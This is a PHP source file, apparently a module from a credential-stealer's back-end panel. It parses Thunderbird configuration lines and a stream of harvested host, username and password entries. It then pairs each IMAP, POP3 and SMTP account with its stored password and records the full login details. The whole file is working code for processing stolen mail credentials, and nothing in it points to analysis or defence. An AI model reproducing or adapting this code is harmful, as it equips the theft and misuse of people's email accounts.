<?php
class Module_thunderbird extends Module_
{
    function ProcessConfig($Source)
    {
        if (!strlen($Source))
            return;

        $Start_ = 'user_pref(';
        $End_ 	= ');';

        $Lines = parse_lines($Source);

        $Settings_ = array();
        foreach ($Lines as $Line)
        {
            $Line = trim($Line);
            if (str_begins($Line, $Start_) && str_ends($Line, $End_))
            {
                $Line = stripslashes(substr($Line, strlen($Start_), - strlen($End_)));
                if (strlen($Line) < 2)
                    continue;

                $TypeEnd = strpos($Line, '",');
                if ($TypeEnd !== false && $Line[0] == '"')
                {
                    $Type  = substr($Line, 1, $TypeEnd - 1);
                    $Value = trim(substr($Line, $TypeEnd + 2));

                    if (str_begins($Value, '"') && str_ends($Value, '"'))
                        $Value = trim(substr($Value, 1, -1));

                    $Settings_[strtolower($Type)] = $Value;
                }
            }
        }
		
        $this->set_options("MailSettings", $Settings_);
    }
    function ProcessData($Source)
    {
		$Settings = $this->get_options("MailSettings");
        $stream = new Stream($Source);
		$Mails = array();
		
        while(TRUE)
        {
            $Host	= $stream->getSTRING_();
            if($Host == NULL)
                break;

            $User 	= $stream->getSTRING_();
            $Pass	= $stream->getSTRING_();

			if (strlen($User) && strlen($Pass) && strlen($Host))
				$Mails[$Host] = array($User, $Pass);
        }
		
		$Accounts = $Settings['mail.accountmanager.accounts'];
		$Accounts = explode(',', $Accounts);
		if (is_array($Accounts) && count($Accounts))
		{
			foreach ($Accounts as $Account)
			{
				$Acc_ = Assign_($Settings['mail.account.'.$Account.'.server']);
				$Host = Assign_($Settings['mail.server.'.$Acc_.'.hostname']);
				$Port = Assign_($Settings['mail.server.'.$Acc_.'.port']);
				$User = Assign_($Settings['mail.server.'.$Acc_.'.username']);
				$Prot = Assign_($Settings['mail.server.'.$Acc_.'.type']);
				$Pass = '';

				if ($Prot == 'imap')
				{
					if (isset($Mails['imap://'.$Host]))
						$Pass = $Mails['imap://'.$Host][1];
				} 
				elseif ($Prot == 'pop3')
				{
					if (isset($Mails['pop3://'.$Host]))
						$Pass = $Mails['pop3://'.$Host][1];
				}

				if (!strlen($Pass))
				{
					if (isset($Mails['mailbox://'.$Host]))
						$Pass = $Mails['mailbox://'.$Host][1];
					else
						$Pass = '';
				}

				$Idents = Assign_($Settings['mail.account.'.$Account.'.identities']);
				$Idents = explode(',', $Idents);
				if (is_array($Idents) && count($Idents))
				{
					error_reporting(0);
					foreach ($Idents as $Ident)
					{
						$Email = Assign_($Settings['mail.identity.'.$Ident.'.useremail']);
						$SMTP___ = Assign_($Settings['mail.identity.'.$Ident.'.smtpserver']);
						
						if (!strlen($SMTP___))
						{
							$SMTP___ = Assign_($Settings['mail.smtp.defaultserver']);
							if (!strlen($SMTP___))
							{
								$SMTPs___ = Assign_($Settings['mail.smtpservers']);
								$SMTPs___ = explode(',', $SMTPs___);
								if (is_array($SMTPs___) && count($SMTPs___))
									$SMTP___ = $SMTPs___[0];
							}
						}

						$SMTPHost = Assign_($Settings['mail.smtpserver.'.$SMTP___.'.hostname']);
						$SMTPUser = Assign_($Settings['mail.smtpserver.'.$SMTP___.'.username']);
						$SMTPPort = Assign_($Settings['mail.smtpserver.'.$SMTP___.'.port']);

						if (isset($Mails['smtp://'.$SMTPHost]))
							$SMTPPass = $Mails['smtp://'.$SMTPHost][1];
						else
							$SMTPPass = '';

						if (is_array($SMTPPass))
							$SMTPPass = $SMTPPass[1];
						
						if ($Prot == 'pop3' || $Prot == 'imap')
							$this->add_email($Email, $Prot, $Host, $Port, $User, $Pass);
						
						$this->add_email($Email, 'smtp', $SMTPHost, $SMTPPort, $SMTPUser, $SMTPPass);
					}
					error_reporting(E_ALL);
				}
			}
		}
		$Mails = NULL;
        $stream = NULL;
		$this->unset_options("MailSettings");
    }
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessData($Data);
            break;
        case 1:
            $this->ProcessConfig($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

